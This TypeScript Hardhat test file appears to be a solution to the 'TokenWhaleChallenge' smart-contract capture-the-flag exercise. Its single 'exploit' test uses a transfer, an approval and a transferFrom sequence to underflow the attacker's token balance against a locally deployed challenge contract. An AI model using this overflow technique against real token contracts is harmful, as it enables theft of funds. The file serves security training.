import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;
  let alice: SignerWithAddress;

  before(async () => {
    [attacker, deployer, alice] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // overflow
    const transferTx = await target.connect(attacker).transfer(alice.address, 501);
    await transferTx.wait();

    const approveTx = await target.connect(alice).approve(attacker.address, 1000);
    await approveTx.wait();

    const transferFromTx = await target
      .connect(attacker)
      .transferFrom(alice.address, alice.address, 500);
    await transferFromTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
